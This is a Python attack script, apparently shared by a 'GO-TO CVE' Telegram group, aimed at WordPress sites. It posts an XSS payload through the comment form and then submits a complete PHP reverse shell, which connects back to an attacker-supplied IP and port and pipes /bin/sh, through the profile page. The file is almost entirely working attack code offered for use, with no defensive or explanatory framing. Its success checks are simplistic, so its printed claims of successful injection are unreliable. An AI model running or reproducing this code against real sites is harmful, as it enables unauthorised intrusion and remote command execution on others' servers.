import argparse
import requests
from colorama import Fore, Style

parser = argparse.ArgumentParser(description="WordPress XSS and Reverse Shell PoC Script")
parser.add_argument("-u", "--url", required=True, help="URL of the target WordPress site")
parser.add_argument("-p", "--payload", required=False, help="Custom XSS payload, defaults to GO-TO CVE alert")
parser.add_argument("--ip", required=True, help="IP address of the attacker")
parser.add_argument("--port", required=True, help="Port number for reverse shell connection")
args = parser.parse_args()

target_url = args.url

xss_payload = args.payload if args.payload else ' onmouseover=alert("GO-TO CVE"); //'

malicious_comment = {
    "author": xss_payload,
    "comment": "Text",
    "submit": "Post Comment"
}

response_comment = requests.post(target_url + "/wp-comments-post.php", data=malicious_comment)

if "Your comment is awaiting moderation." in response_comment.text:
    print("XSS Comment successfully posted on /wp-comments-post.php!")
else:
    print("Failed to post XSS Comment on /wp-comments-post.php.")

print(Style.BRIGHT + Fore.RED + "\nGO-TO CVE\n" + Style.RESET_ALL)
print(Style.BRIGHT + Fore.GREEN + "Telegram: https://t.me/GOTOCVE" + Style.RESET_ALL)

reverse_shell_payload = f"""<?php
set_time_limit(0);
$ip = '{args.ip}'; 
$port = {args.port};  
$chunk_size = 1400;
$shell = '/bin/sh';
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
$descriptorspec = array(
   0 => array("pipe", "r"),
   1 => array("pipe", "w"),
   2 => array("pipe", "w")
);
$process = proc_open($shell, $descriptorspec, $pipes);
if (is_resource($process)) {{
    while (!feof($pipes[1])) {{
        $output = fread($pipes[1], $chunk_size);
        fwrite($sock, $output);
        $input = fread($sock, $chunk_size);
        fwrite($pipes[0], $input);
    }}
}}
fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);
?>"""

malicious_profile = {
    "first_name": reverse_shell_payload,
    "submit": "Update Profile"
}

response_profile = requests.post(target_url + "/wp-admin/profile.php", data=malicious_profile)

if response_profile.status_code == 200:
    print(f"Reverse Shell successfully injected on {target_url}/wp-admin/profile.php!")
else:
    print("Failed to inject Reverse Shell on /wp-admin/profile.php.")
